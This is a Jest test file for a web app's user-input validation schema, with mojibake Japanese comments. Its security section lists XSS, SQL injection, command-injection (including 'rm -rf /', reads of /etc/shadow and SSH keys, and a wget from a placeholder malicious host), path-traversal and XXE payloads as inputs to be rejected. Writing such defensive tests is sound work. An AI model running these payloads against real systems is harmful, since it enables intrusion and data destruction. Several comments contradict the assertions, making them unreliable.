/**
 * @jest-environment jsdom
 */
import { UserInputSchema } from "./userInputSchemas";
import { ProblemResultTypeEnum } from "@/constants/problemTypes";

describe("UserInputSchema Validation", () => {
    // Ê≠£Â∏∏Á≥ª„ÅÆ„ÉÜ„Çπ„Éà„Ç±„Éº„Çπ
    describe("Valid cases", () => {
        it("should validate a correct single input", () => {
            const validInput = {
                input: [{
                    value: "test answer",
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing valid single input");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate multiple inputs up to maximum limit", () => {
            const validInput = {
                input: Array(10).fill({
                    value: "test answer",
                    isCorrect: false,
                    timeSpent: 1000
                }),
                result: "incorrect" as const, // Ê≠£Á¢∫„Å™„Çπ„Éö„É´„Å®„Ç±„Éº„Çπ
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing multiple inputs up to maximum limit");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate with minimum length string", () => {
            const validInput = {
                input: [{
                    value: "a", // minimum 1 character
                    isCorrect: true,
                    timeSpent: 0 // minimum timeSpent
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing minimum length string");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate with maximum length string", () => {
            const validInput = {
                input: [{
                    value: "a".repeat(600), // maximum 600 characters
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing maximum length string");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should handle unicode characters", () => {
            const unicodeInput = {
                input: [{
                    value: "„Åì„Çì„Å´„Å°„ÅØ‰∏ñÁïåüåç",
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date()
            };

            console.log("Testing unicode characters");
            expect(() => UserInputSchema.parse(unicodeInput)).not.toThrow();
        });

        it("should accept all valid result types", () => {
            const resultTypes = ProblemResultTypeEnum.options;

            resultTypes.forEach(resultType => {
                const validInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: resultType,
                    attemptedAt: new Date()
                };

                console.log(`Testing result type: ${resultType}`);
                expect(() => UserInputSchema.parse(validInput)).not.toThrow();
            });
        });
    });

    // Áï∞Â∏∏Á≥ª„ÅÆ„ÉÜ„Çπ„Éà„Ç±„Éº„Çπ
    describe("Invalid cases", () => {
        describe("input array validation", () => {
            it("should reject empty input array", () => {
                const invalidInput = {
                    input: [],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing empty input array");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject more than 10 inputs", () => {
                const invalidInput = {
                    input: Array(11).fill({
                        value: "test answer",
                        isCorrect: true,
                        timeSpent: 1000
                    }),
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing more than 10 inputs");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject input with missing fields", () => {
                const invalidInputs = [
                    { input: [{ isCorrect: true, timeSpent: 1000 }] }, // value„ÅåÊ¨†„Åë„Å¶„ÅÑ„Çã
                    { input: [{ value: "test", timeSpent: 1000 }] }, // isCorrect„ÅåÊ¨†„Åë„Å¶„ÅÑ„Çã
                    { input: [{ value: "test", isCorrect: true }] }, // timeSpent„ÅåÊ¨†„Åë„Å¶„ÅÑ„Çã
                ];

                invalidInputs.forEach((invalidInput, index) => {
                    console.log(`Testing input with missing fields - Case ${index + 1}`);
                    expect(() => UserInputSchema.parse({
                        ...invalidInput,
                        result: "correct" as const,
                        attemptedAt: new Date()
                    })).toThrow();
                });
            });
        });

        describe("value field validation", () => {
            it("should reject empty string value", () => {
                const invalidInput = {
                    input: [{
                        value: "",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing empty string value");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject string longer than 600 characters", () => {
                const invalidInput = {
                    input: [{
                        value: "a".repeat(601),
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing string longer than 600 characters");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("timeSpent validation", () => {
            const invalidTimeSpents = [
                -1,              // Ë≤†„ÅÆÊï∞
                1.5,             // Â∞èÊï∞
                NaN,             // ÈùûÊï∞
                Infinity,        // ÁÑ°ÈôêÂ§ß
                "1000",          // ÊñáÂ≠óÂàó
                null,            // null
                undefined        // undefined
            ];

            test.each(invalidTimeSpents)("ÁÑ°Âäπ„Å™timeSpentÂÄ§: %p", (timeSpent) => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log(`Testing invalid timeSpent value: ${timeSpent}`);
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("result field validation", () => {
            it("should reject invalid result type", () => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "INVALID_TYPE" as Exclude<string, typeof ProblemResultTypeEnum._type>,
                    attemptedAt: new Date()
                };

                console.log("Testing invalid result type");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("attemptedAt validation", () => {
            const invalidDates = [
                "invalid-date",
                null,
                undefined,
                {},
                [],
                true,
                123
            ];

            test.each(invalidDates)("ÁÑ°Âäπ„Å™Êó•‰ªòÂÄ§: %p", (invalidDate: string | null | undefined | object | boolean | number) => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: invalidDate
                };

                console.log(`Testing invalid attemptedAt value: ${invalidDate}`);
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });
    });

    // „Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà
    describe("„Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà", () => {
        describe("XSSÂØæÁ≠ñ", () => {
            const xssPatterns = [
                // Âü∫Êú¨ÁöÑ„Å™XSS„Éë„Çø„Éº„É≥
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "<div style='background-image: url(&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert&#x28;&#x27;xss&#x27;&#x29;&#x29;')>",
                "<svg onload=alert('xss')>",
                "<iframe src=javascript:alert('xss')>",
                "<object data=javascript:alert('xss')>",
                "<embed src=javascript:alert('xss')>",

                // „Ç§„Éô„É≥„Éà„Éè„É≥„Éâ„É©„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<a onmouseover=alert('xss')>hover me</a>",
                "<input type='text' onfocus=alert('xss')>",
                "<select onfocus=alert('xss')><option>test</option></select>",
                "<textarea onfocus=alert('xss')>",
                "<button onclick=alert('xss')>click me</button>",

                // „Éï„Ç©„Éº„É†Ë¶ÅÁ¥†„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<input type='submit' onmouseover=alert('xss')>",
                "<input type='reset' onmouseover=alert('xss')>",
                "<input type='button' onmouseover=alert('xss')>",
                "<input type='image' onmouseover=alert('xss')>",
                "<input type='checkbox' onmouseover=alert('xss')>",
                "<input type='radio' onmouseover=alert('xss')>",
                "<option onmouseover=alert('xss')>",
                "<optgroup onmouseover=alert('xss')>",
                "<label onmouseover=alert('xss')>xss test</label>",
                "<fieldset onmouseover=alert('xss')>",
                "<legend onmouseover=alert('xss')>",

                // „ÉÜ„Éº„Éñ„É´Ë¶ÅÁ¥†„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<table onmouseover=alert('xss')>",
                "<tr onmouseover=alert('xss')>",
                "<td onmouseover=alert('xss')>",
                "<th onmouseover=alert('xss')>",

                // „É™„Çπ„ÉàË¶ÅÁ¥†„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<ul onmouseover=alert('xss')>",
                "<ol onmouseover=alert('xss')>",
                "<li onmouseover=alert('xss')>",
                "<dl onmouseover=alert('xss')>",
                "<dt onmouseover=alert('xss')>",
                "<dd onmouseover=alert('xss')>",

                // „ÉÜ„Ç≠„Çπ„ÉàË¶ÅÁ¥†„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<p onmouseover=alert('xss')>",
                "<h1 onmouseover=alert('xss')>",
                "<h2 onmouseover=alert('xss')>",
                "<h3 onmouseover=alert('xss')>",
                "<h4 onmouseover=alert('xss')>",
                "<h5 onmouseover=alert('xss')>",
                "<h6 onmouseover=alert('xss')>",

                // „Ç§„É≥„É©„Ç§„É≥Ë¶ÅÁ¥†„Çí‰ΩøÁî®„Åó„ÅüXSS
                "<span onmouseover=alert('xss')>",
                "<b onmouseover=alert('xss')>",
                "<i onmouseover=alert('xss')>",
                "<small onmouseover=alert('xss')>",
                "<strong onmouseover=alert('xss')>",
                "<em onmouseover=alert('xss')>",
                "<mark onmouseover=alert('xss')>",
                "<sub onmouseover=alert('xss')>",
                "<sup onmouseover=alert('xss')>",

                // „Ç®„É≥„Ç≥„Éº„Éâ„Åï„Çå„ÅüXSS
                "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",
                "&#x3C;img src=x onerror=alert('xss')&#x3E;",
                "%3Cscript%3Ealert('xss')%3C/script%3E",
                "\u003Cscript\u003Ealert('xss')\u003C/script\u003E",

                // „Éá„Éº„ÇøURI„Çí‰ΩøÁî®„Åó„ÅüXSS
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
                "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ3hzcycpPg==",

                // SVGÂ±ûÊÄß„ÄÅBase64„Éá„Ç≥„Éº„ÉâÂæå„ÄÅ„Ç≥„É°„É≥„ÉàÂÜÖ„ÅÆ„Çπ„ÇØ„É™„Éó„ÉàÂüã„ÇÅËæº„Åø
                "<svg><script>alert('xss')</script></svg>",
                "<a href='javascript:alert(`xss`)'>click</a>",
                "<!--<script>alert('xss')</script>-->",
                "<style>@import 'javascript:alert(`xss`)';</style>",
                "<img src=\"x\" onerror=\"eval('alert(`xss`)')\">",

                    // È´òÂ∫¶„Å™XSS„Éë„Çø„Éº„É≥
                "<script>document.write('<img src=1 onerror=alert(1)>');</script>",
                "<div onmouseover='alert(`XSS`)'>Hover me!</div>",
                "javascript:window['alert'](`XSS`)",
                "<script>/*<![CDATA[*/alert(1)/*]]>*/</script>",
                "Set-Cookie: session=<script>alert(1)</script>;",
            ];

            test.each(xssPatterns)("XSS„Éë„Çø„Éº„É≥„ÅÆÊ§úË®º: %s", (xssPattern) => {
                const input = {
                    input: [{
                        value: xssPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // XSS„Éë„Çø„Éº„É≥„ÅØ„Çπ„Ç≠„Éº„Éû„ÅßÊãíÂê¶„Åï„Çå„Çã„Åπ„Åç
                console.log(`Testing XSS pattern: ${xssPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("SQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥ÂØæÁ≠ñ", () => {
            const sqlInjectionPatterns = [
                // Âü∫Êú¨ÁöÑ„Å™SQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users; --",
                "'; DELETE FROM users; --",

                // Ë™çË®º„Éê„Ç§„Éë„Çπ
                "admin' --",
                "admin' OR '1'='1",
                "' OR 1=1; --",
                "' OR 'x'='x",
                "' Or '1'='1",
                "' oR '1'='1",
                "' or '1'='1",

                // Inline comments
                "' UNION SELECT * FROM users --",
                "' UNION SELECT 1, 'admin'--",
                "' OR 1=1 /* bypass */",
                "admin' /* injection */",

                // „Éá„Éº„ÇøÊäΩÂá∫
                "' UNION SELECT username, password FROM users; --",
                "' UNION SELECT null, table_name FROM information_schema.tables; --",
                "' UNION SELECT null, column_name FROM information_schema.columns; --",

                // „Éá„Éº„Çø„Éô„Éº„ÇπÊÉÖÂ†±ÂèñÂæó
                "' UNION SELECT @@version; --",
                "' UNION SELECT current_database(); --",
                "' UNION SELECT user(); --",

                // ÊôÇÈñì„Éô„Éº„ÇπÊîªÊíÉ
                "'; WAITFOR DELAY '0:0:10'; --",
                "'; SELECT SLEEP(10); --",
                "'; BENCHMARK(1000000,MD5('test')); --",

                // „Éñ„É©„Ç§„É≥„ÉâSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "' AND (SELECT COUNT(*) FROM users) > 0; --",
                "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 32; --",

                // „Çπ„Çø„ÉÉ„ÇØ„Éâ„ÇØ„Ç®„É™
                "; INSERT INTO users VALUES ('hacked', 'hacked'); --",
                "; UPDATE users SET admin=1; --",
                "; TRUNCATE TABLE logs; --",

                "0x61646d696e", // Hex encoding for "admin"
                "' OR 1=1/*",
                "' UNION SELECT 1, CONCAT(username, ':', password) FROM users --",
                "' AND (SELECT ascii(substring((SELECT password FROM users LIMIT 1),1,1)))>0 --",
                "admin' AND 1=CAST((SELECT COUNT(*) FROM users) AS INT)--",

                // Subqueries and expressions
                "' AND (SELECT username FROM users WHERE username='admin')='admin'",
                "' OR EXISTS(SELECT 1 FROM dual WHERE 'a'='a')",
                "' UNION ALL SELECT NULL, database()--",

                // SQL Sleep and benchmark attacks
                "'; WAITFOR DELAY '0:0:10'; --",
                "' AND BENCHMARK(1000000, MD5('test'))--",

                // SQL error-based injection
                "' AND 1=(SELECT 1/(SELECT 0 FROM users LIMIT 1))--",

                // Advanced encoding (URL, Base64)
                "%27%20OR%20%271%27=%271", // URL-encoded ' OR '1'='1
                "dW5pb24gc2VsZWN0ICogZnJvbSB1c2Vycy0t", // Base64 encoded "union select * from users--"


            ];

            test.each(sqlInjectionPatterns)("SQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„Éë„Çø„Éº„É≥„ÅÆÊ§úË®º: %s", (sqlPattern) => {
                const input = {
                    input: [{
                        value: sqlPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // SQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„Éë„Çø„Éº„É≥„ÅØ„Çπ„Ç≠„Éº„Éû„ÅßË®±ÂèØ„Åï„Çå„Çã„Åå„ÄÅ
                // ÂÆüÈöõ„ÅÆ‰ΩøÁî®ÊôÇ„Å´„ÅØ„Çµ„Éã„Çø„Ç§„Ç∫„ÇÑ„Ç®„Çπ„Ç±„Éº„Éó„ÅåÂøÖË¶Å
                // „Åì„Åì„Åß„ÅØÊñáÂ≠óÂàó„Å®„Åó„Å¶Ë®±ÂèØ„Åï„Çå„Çã„Åü„ÇÅ„ÄÅnot.toThrow()„ÇíÊúüÂæÖ
                console.log(`Testing SQL Injection pattern: ${sqlPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("„Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥ÂØæÁ≠ñ", () => {
            const commandInjectionPatterns = [
                // Âü∫Êú¨ÁöÑ„Å™„Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "; rm -rf /",
                "| rm -rf /",
                "& rm -rf /",
                "`rm -rf /`",
                "$(rm -rf /)",
                "; ls -la",
                "&& cat /etc/passwd",
                "| echo vulnerable > /tmp/vulnerable",

                // Ë§áÊï∞„Ç≥„Éû„É≥„Éâ„ÅÆÂÆüË°å
                "; cat /etc/passwd",
                "& cat /etc/shadow",
                "| cat /etc/hosts",

                // Nested commands
                "$(id)",
                "`whoami`",

                // „Ç∑„Çß„É´„Ç≥„Éû„É≥„Éâ
                "> /etc/passwd",
                "< /etc/shadow",
                ">> /etc/hosts",

                // Áí∞Â¢ÉÂ§âÊï∞„ÅÆÂà©Áî®
                "$PATH",
                "${PATH}",
                "$(echo $HOME)",

                // Environment variable expansion
                "${IFS}ls${IFS}-la",
                "${HOME}/.ssh/id_rsa",
                "${PATH}; rm -rf /",

                // Hex and Base64 payloads
                "$(echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d)",
                "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",

                // Chained commands
                "&& echo malicious && echo vulnerable",
                "|| touch /tmp/hacked",
                "| ping -c 1 127.0.0.1",

                // „Ç®„Çπ„Ç±„Éº„Éó„Ç∑„Éº„Ç±„É≥„Çπ
                "\n rm -rf /",
                "\r\n cat /etc/passwd",
                "\t wget malicious.com/script",

                ";echo $USER",
                "`ls -la`",
                "& ping -c 3 127.0.0.1",
                "| touch /tmp/hacked",
                "${IFS%??}cat${IFS%??}/etc/passwd",

            ];

            test.each(commandInjectionPatterns)("„Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„Éë„Çø„Éº„É≥„ÅÆÊ§úË®º: %s", (commandPattern) => {
                const input = {
                    input: [{
                        value: commandPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // „Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„Éë„Çø„Éº„É≥„ÅØ„Çπ„Ç≠„Éº„Éû„ÅßË®±ÂèØ„Åï„Çå„Çã„Åå„ÄÅ
                // ÂÆüÈöõ„ÅÆ‰ΩøÁî®ÊôÇ„Å´„ÅØ„Çµ„Éã„Çø„Ç§„Ç∫„ÇÑ„Ç®„Çπ„Ç±„Éº„Éó„ÅåÂøÖË¶Å
                // „Åì„Åì„Åß„ÅØÊñáÂ≠óÂàó„Å®„Åó„Å¶Ë®±ÂèØ„Åï„Çå„Çã„Åü„ÇÅ„ÄÅnot.toThrow()„ÇíÊúüÂæÖ
                console.log(`Testing Command Injection pattern: ${commandPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´ÂØæÁ≠ñ", () => {
            const pathTraversalPatterns = [
                // Âü∫Êú¨ÁöÑ„Å™„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system.ini",
                "/etc/passwd",
                "C:\\Windows\\system.ini",
                "../../../etc/shadow",
                "../../../../../usr/local/bin",

                // „Ç®„É≥„Ç≥„Éº„Éâ„Åï„Çå„Åü„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "%252e%252e%252f%252e%252e%252f",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2fbin",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

                // Nested traversal
                "/../../../../etc/passwd",
                "....//....//....//var/log",

                // Unicode/UTF-8„Ç®„É≥„Ç≥„Éº„Éâ
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",

                // Ë§áÂêà„Éë„Çø„Éº„É≥
                "....//....//....//etc/passwd",
                "....//../../../etc/passwd",
                "../../../../../../../../etc/passwd",

                "..%2f..%2fetc%2fpasswd",
                "..%c0%2f%c0%af%c0%afetc%c0%afpasswd",
                "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
                "/../../../../etc/passwd",
                "....//....//....//windows\\system.ini",
                "....%2f....%2f....%2fetc%2fshadow",
                "..%252f..%252f..%252fetc%252fpasswd",
                "%252e%252e/%252e%252e/%252e%252e/etc/passwd",

                // Windows-specific patterns
                "..\\..\\..\\windows\\system32\\config",
                "..%5c..%5c..%5cwindows%5csystem32%5cconfig",

            ];

            test.each(pathTraversalPatterns)("„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´„Éë„Çø„Éº„É≥„ÅÆÊ§úË®º: %s", (pathPattern) => {
                const input = {
                    input: [{
                        value: pathPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // „Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´„Éë„Çø„Éº„É≥„ÅØ„Çπ„Ç≠„Éº„Éû„ÅßË®±ÂèØ„Åï„Çå„Çã„Åå„ÄÅ
                // ÂÆüÈöõ„ÅÆ‰ΩøÁî®ÊôÇ„Å´„ÅØ„Çµ„Éã„Çø„Ç§„Ç∫„ÇÑ„Éë„ÇπÊ≠£Ë¶èÂåñ„ÅåÂøÖË¶Å
                // „Åì„Åì„Åß„ÅØÊñáÂ≠óÂàó„Å®„Åó„Å¶Ë®±ÂèØ„Åï„Çå„Çã„Åü„ÇÅ„ÄÅnot.toThrow()„ÇíÊúüÂæÖ
                console.log(`Testing Path Traversal pattern: ${pathPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("„Åù„ÅÆ‰ªñ„ÅÆ„Çª„Ç≠„É•„É™„ÉÜ„Ç£ÂØæÁ≠ñ", () => {
            const otherSecurityPatterns = [
                // CRLF „Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "First line\r\nSecond line",
                "Header injection\r\nmalicious-header: value",
                "Header injection\r\nContent-Length: 0\r\n",

                // „ÉÜ„É≥„Éó„É¨„Éº„Éà„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "${7*7}",
                "#{7*7}",
                "${System.getenv('PATH')}",

                // XML„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<![CDATA[<script>alert('xss')</script>]]>",

                // LDAP„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
                "*)(uid=*))(|(uid=*",
                ")(|(password=*))",

                // „Éê„ÉÉ„Éï„Ç°„Ç™„Éº„Éê„Éº„Éï„É≠„ÉºË©¶Ë°å
                "A".repeat(10000),
                "\0".repeat(1000),

                // UnicodeÂà∂Âæ°ÊñáÂ≠ó
                "\u0000\u0001\u0002\u0003",
                "\u001F\u007F\u0080\u0081\u0082",
                "\u202Eexe\u202C.bat",
                "\u0000\u0001\u0002\u0003\u001F\u007F",

                // ÁâπÊÆäÊñáÂ≠ó„ÅÆÁµÑ„ÅøÂêà„Çè„Åõ
                "¬∂¬•¬ß¬©¬Æ‚Ñ¢‚Ç¨¬£¬¢¬§",

                // Complex payloads
                "JSON.parse('{\"key\": \"<script>alert(`xss`)</script>\"}')",
                "<![CDATA[<script>alert('xss')</script>]]>",
                "eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))",
                "<!-- Injection -->\nalert('test')",
                "\u202Eexe\u202C.bat",
                "JSON.parse('{\"key\": \"<script>alert(`xss`)</script>\"}')",
                "`rm -rf /`;",
                "<![CDATA[<script>alert('xss')</script>]]>",

                // Embedded payloads in data
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
                "data:application/json;base64,eyJrZXkiOiAiPHNjcmlwdD5hbGVydCgweHNzKTwvc2NyaXB0PiJ9",
            ];

            test.each(otherSecurityPatterns)("„Åù„ÅÆ‰ªñ„ÅÆ„Çª„Ç≠„É•„É™„ÉÜ„Ç£„Éë„Çø„Éº„É≥„ÅÆÊ§úË®º: %s", (pattern) => {
                const input = {
                    input: [{
                        value: pattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                if (pattern.length > 600) {
                    // 600ÊñáÂ≠ó„ÇíË∂Ö„Åà„ÇãÂ†¥Âêà„ÅØ„Ç®„É©„Éº„ÇíÊúüÂæÖ
                    console.log(`Testing disallowed pattern (length > 600): ${pattern.substring(0, 50)}...`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                } else if (/<[^>]*>/g.test(pattern)) {
                    // HTML„Çø„Ç∞„ÇíÂê´„ÇÄÂ†¥Âêà„ÅØ„Ç®„É©„Éº„ÇíÊúüÂæÖ
                    console.log(`Testing disallowed pattern (contains HTML tags): ${pattern}`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                } else {
                    // „Åù„ÅÆ‰ªñ„ÅÆ„Çª„Ç≠„É•„É™„ÉÜ„Ç£„Éë„Çø„Éº„É≥„ÅØË®±ÂèØ„Åï„Çå„Çã
                    console.log(`Testing allowed pattern: ${pattern}`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                }
            });
        });
    });
});
